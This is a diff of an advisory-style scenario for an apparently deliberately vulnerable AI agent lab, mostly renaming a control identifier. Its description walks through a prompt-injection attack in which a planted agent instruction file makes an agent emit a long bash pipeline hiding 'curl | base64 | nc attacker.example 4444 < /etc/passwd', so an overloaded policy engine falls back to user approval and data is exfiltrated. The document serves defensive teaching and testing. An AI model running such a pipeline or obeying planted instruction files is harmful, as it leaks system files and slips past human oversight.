@@ -4,7 +4,7 @@
 **Severity:** Critical
 **Check IDs:** PEI-001, PEI-002, ARP-ASK-FALLBACK
 **ATM Techniques:** T-6004, T-2001, T-8002
-**Related Controls:** OASB-SEC-021, OPENA2A-IB-007
+**Related Controls:** OASB-SEC-021, LAB-IB-007
 
 ## Description
 
@@ -12,7 +12,7 @@ A vulnerable policy enforcement engine guards agent actions by parsing command p
 
 An attacker injects a malicious agent instruction file (`dvaa-agent.md`) that coaxes the agent into emitting a bash pipeline containing 50+ subcommands. The first few subcommands look benign (`ls`, `cat`, `grep`). The malicious payload — `curl | base64 | nc attacker.example 4444 < /etc/passwd` — is hidden past subcommand index 40, well past any preview window. When the pipeline exceeds `maxSubcommands`, the enforcement engine falls back to `ASK_USER`, the operator approves what looks like a log-processing pipeline, and exfiltration succeeds.
 
-This is the canonical "threshold bypass" kill chain from OPENA2A-IB-007: any enforcement boundary that degrades to human consent under load is not a boundary — it is a speed bump that attackers cross by generating enough load.
+This is the canonical "threshold bypass" kill chain from LAB-IB-007: any enforcement boundary that degrades to human consent under load is not a boundary — it is a speed bump that attackers cross by generating enough load.
 
 ## Attack Chain
 
@@ -71,7 +71,7 @@ HMA currently ships live-agent LLM probes under the `PEI-*` family (`PEI-001..00
 - **Audit every threshold constant:** search the enforcement codebase for `MAX_`, `THRESHOLD`, `LIMIT`, `timeout`. For each one, trace what happens when it is exceeded. If any path leads to user consent or silent bypass, it is a threshold-bypass vulnerability.
 
 **References:**
-- OPENA2A-IB-007 — Threshold Bypass of AI Agent Policy Enforcement
+- LAB-IB-007 — Threshold Bypass of AI Agent Policy Enforcement
 - OASB-SEC-021 — Policy Enforcement Fail-Closed Semantics
 - [CWE-754: Improper Check for Unusual or Exceptional Conditions](https://cwe.mitre.org/data/definitions/754.html)
 - [CWE-807: Reliance on Untrusted Inputs in a Security Decision](https://cwe.mitre.org/data/definitions/807.html)
